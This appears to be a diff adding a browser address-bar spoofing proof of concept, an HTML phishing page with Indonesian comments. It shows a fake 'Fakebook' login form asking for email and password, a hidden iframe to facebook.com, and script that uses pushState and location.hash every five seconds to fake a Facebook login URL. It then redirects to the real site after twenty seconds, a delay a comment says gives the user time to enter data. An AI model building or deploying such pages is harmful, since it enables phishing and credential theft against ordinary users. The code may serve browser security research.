@@ -1,0 +1,57 @@
+<html>
+<head>
+    <title>Address Bar Spoofing Brave</title>
+    <style>
+        /* Gaya untuk menyembunyikan iframe yang berisi URL asli */
+        iframe {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 0;
+            height: 0;
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Fakebook</h1>
+    <form>
+        Email: <input type="text" name="username" placeholder="Enter email"><br>
+        Password: <input type="password" name="password" placeholder="Enter password">
+    </form>
+
+    <!-- Iframe menuju URL asli -->
+    <iframe id="realFacebook" src="https://facebook.com"></iframe>
+
+    <script>
+        // Fungsi untuk memanipulasi URL di address bar menggunakan pushState dan location.hash
+        function spoofAddressBar() {
+            // Ganti URL menggunakan pushState
+            history.pushState({}, "Fake Facebook", "/login.php");
+            // Ganti hash untuk menambah kesan legitimasi
+            location.hash = "facebook.com/login";
+        }
+
+        // Pengalihan alamat halaman asli dengan iframe tersembunyi
+        function createIllusion() {
+            // Setiap 5 detik, ganti URL di address bar dengan yang palsu
+            setInterval(function() {
+                spoofAddressBar();
+            }, 5000);
+        }
+
+        // Fungsi untuk pengalihan cepat kembali ke halaman asli menggunakan iframe
+        function redirectToRealFacebook() {
+            // Ubah window.location ke halaman Facebook asli setelah beberapa saat
+            setTimeout(function() {
+                location = "https://facebook.com";
+            }, 20000); // Pengalihan ke halaman asli setelah 20 detik (misal, memberi waktu user untuk input data palsu)
+        }
+
+        // Jalankan fungsi spoofing dan pengalihan
+        createIllusion();
+        redirectToRealFacebook();
+
+    </script>
+</body>
+</html>
